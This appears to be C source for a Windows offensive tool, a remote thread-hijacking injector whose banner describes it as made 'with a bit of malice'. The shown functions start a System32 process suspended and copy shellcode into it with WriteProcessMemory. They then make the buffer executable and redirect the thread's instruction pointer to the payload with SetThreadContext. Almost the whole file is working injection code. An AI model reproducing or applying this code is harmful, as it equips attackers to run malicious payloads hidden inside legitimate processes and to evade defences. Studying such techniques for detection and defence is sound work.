#include "injection.h"

VOID PrintBanner(VOID) {
	printf(
		"   ________                   __  __ ___   _          __                                       \n"
		"  /_  __/ /  _______ ___ ____/ / / // (_) (_)__ _____/ /__                                     \n"
		"   / / / _ \\/ __/ -_) _ `/ _  / / _  / / / / _ `/ __/  '_/                                    \n"
		"  /_/ /_//_/_/  \\__/\\_,_/\\_,_/ /_//_/_/_/ /\\_,_/\\__/_/\\_\\                               \n"
		"                                     |___/                                                     \n"
		"  ( ( remote ) )                                                                             \n\n"
		"  /*!                                                                                          \n"
		"   * made with love and a bit of malice <3                                                     \n"
		"   * -> https://www.crow.rip, @cr-0w, crow@crow.rip                                            \n"
		"   *                                                                                           \n"
		"   * disclaimer: I am not the author of this technique, this is just *my* implementation of it.\n"
		"   * warning: I am not responsible for what you do with this program. use this responsibly!    \n"
		"   * enjoy, nerds. lots o' luv.                                                                \n"
		"   */                                                                                        \n\n"
	);
}

BOOL CreateSuspendedProcess(
	_In_  LPCSTR ProcessName,
	_Out_ PDWORD ProcessId,
	_Out_ PHANDLE ProcessHandle,
	_Out_ PHANDLE ThreadHandle
) {

	BOOL State = TRUE;
	CHAR Path[MAX_PATH * 2];
	CHAR WindowsDir[MAX_PATH];
	STARTUPINFO SI;
	PROCESS_INFORMATION PI;

	RtlSecureZeroMemory(&SI, sizeof(SI));
	RtlSecureZeroMemory(&PI, sizeof(PI));

	if (!GetEnvironmentVariableA("WINDIR", WindowsDir, MAX_PATH)) {
		PRINT_ERROR("GetEnvironmentVariableA");
		return FALSE;
	}

	sprintf_s(Path, sizeof(Path), "%s\\System32\\%s", WindowsDir, ProcessName);
	INFO("attempting to start %s (%s)...", ProcessName, Path);

	if (!CreateProcessA(NULL, Path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
		PRINT_ERROR("CreateProcessA");
		return FALSE;
	}
	OKAY("%s started in suspended mode!", ProcessName);

	if (0 == PI.dwProcessId || NULL == PI.hProcess || NULL == PI.hThread) {
		WARN("something broke, exiting...");
		return FALSE;
	}

	*ProcessId = PI.dwProcessId; *ProcessHandle = PI.hProcess; *ThreadHandle = PI.hThread;
	OKAY("[0x%p] got a handle on the process (%ld)!", *ProcessHandle, *ProcessId);
	OKAY("[0x%p] got a handle on the thread (%ld)!", *ThreadHandle, PI.dwThreadId);

	return TRUE;

}

BOOL RemoteThreadHijack(
	_In_ HANDLE ThreadHandle,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID  Buffer,
	_In_ PBYTE  Shellcode,
	_In_ SIZE_T ShellcodeSize
) {

	DWORD   OldProtection = 0;
	BOOL    State         = TRUE;
	CONTEXT CTX           = { .ContextFlags = CONTEXT_ALL };

	WriteProcessMemory(ProcessHandle, Buffer, Shellcode, ShellcodeSize, 0);
	OKAY("[0x%p] [RW-] copied payload contents (%zu-bytes) to the allocated buffer", Buffer, ShellcodeSize);

	if (!VirtualProtectEx(ProcessHandle, Buffer, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection)) {
		PRINT_ERROR("VirtualProtect");
		State = FALSE; goto CLEANUP;
	}
	OKAY("[0x%p] [R-X] changed memory protection of allocated buffer to PAGE_EXECUTE_READ [R-X]", Buffer);

	if (!GetThreadContext(ThreadHandle, &CTX)) {
		PRINT_ERROR("GetThreadContext");
		State = FALSE; goto CLEANUP;
	}
	OKAY("[0x%p] got the thread's context! here are the register values:", &CTX);

	printf(
		"[v] |              \n"
		"[v] | RIP -> [0x%p]\n"
		"[v] | RAX -> [0x%p]\n"
		"[v] | RBX -> [0x%p]\n"
		"[v] | RCX -> [0x%p]\n"
		"[v] | RDX -> [0x%p]\n"
		"[v] | RSP -> [0x%p]\n"
		"[v] | RBP -> [0x%p]\n",
		(PVOID*)CTX.Rip, (PVOID*)CTX.Rax, (PVOID*)CTX.Rbx,
		(PVOID*)CTX.Rcx, (PVOID*)CTX.Rdx, (PVOID*)CTX.Rsp, (PVOID*)CTX.Rbp
	);
	INFO("| RIP -> [0x%p] updating the thread's context to make RIP point to our allocated buffer...", (PVOID*)CTX.Rip);

	CTX.Rip = (DWORD64)Buffer;

	if (!SetThreadContext(ThreadHandle, &CTX)) {
		PRINT_ERROR("SetThreadContext");
		State = FALSE; goto CLEANUP;
	}
	OKAY("| RIP -> [0x%p] set the thread's context! RIP now points to our payload buffer!", (PVOID*)CTX.Rip);

	printf(
		"[v] | RIP -> [0x%p]\n"
		"[v] | RAX -> [0x%p]\n"
		"[v] | RBX -> [0x%p]\n"
		"[v] | RCX -> [0x%p]\n"
		"[v] | RDX -> [0x%p]\n"
		"[v] | RSP -> [0x%p]\n"
		"[v] | RBP -> [0x%p]\n"
		"[v] |              \n",
		(PVOID*)CTX.Rip, (PVOID*)CTX.Rax, (PVOID*)CTX.Rbx,
		(PVOID*)CTX.Rcx, (PVOID*)CTX.Rdx, (PVOID*)CTX.Rsp, (PVOID*)CTX.Rbp
	);

CLEANUP:

	if (TRUE != State) {
		if (ThreadHandle) {
			WARN("[0x%p] something broke. closed thread handle", ThreadHandle);
			CloseHandle(ThreadHandle);
		}
	}

	return State;

}
